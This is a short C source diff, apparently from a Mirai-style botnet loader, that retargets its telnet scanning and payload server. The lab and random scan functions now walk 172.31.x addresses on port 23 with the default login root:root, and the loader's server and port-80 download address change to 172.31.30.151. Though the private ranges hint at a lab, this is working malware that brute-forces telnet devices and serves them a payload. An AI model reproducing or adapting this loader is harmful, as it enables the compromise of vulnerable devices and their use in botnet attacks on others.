@@ -56,7 +56,7 @@ void auto_scan_lab(void)
     for (int i = 1; i <= 254; i++)
     {
         char strbuf[128];
-        snprintf(strbuf, sizeof(strbuf), "192.168.1.%d:23 root:root", i);
+        snprintf(strbuf, sizeof(strbuf), "172.31.30.%d:23 root:root", i);
         
         memset(&info, 0, sizeof(struct telnet_info));
         if (telnet_info_parse(strbuf, &info) != NULL)
@@ -123,7 +123,7 @@ void auto_scan_random(void)
         uint8_t o3 = rand() % 256;
         uint8_t o4 = (rand() % 254) + 1;
         
-        snprintf(strbuf, sizeof(strbuf), "192.168.%d.%d:23 root:root", o3, o4);
+        snprintf(strbuf, sizeof(strbuf), "172.31.%d.%d:23 root:root", o3, o4);
         
         memset(&info, 0, sizeof(struct telnet_info));
         if (telnet_info_parse(strbuf, &info) != NULL)
@@ -151,7 +151,7 @@ int main(int argc, char **args)
 
     addrs_len = 1;
     addrs = calloc(addrs_len, sizeof(ipv4_t));
-    addrs[0] = inet_addr("192.168.1.57");
+    addrs[0] = inet_addr("172.31.30.151");
 
     if (argc == 2)
         id_tag = args[1];
@@ -163,7 +163,7 @@ int main(int argc, char **args)
     }
 
     if ((srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_len, addrs, 
-                              1024 * 64, "192.168.1.57", 80, "192.168.1.57")) == NULL)
+                              1024 * 64, "172.31.30.151", 80, "172.31.30.151")) == NULL)
     {
         printf("Failed to initialize server. Aborting\n");
         return 1;
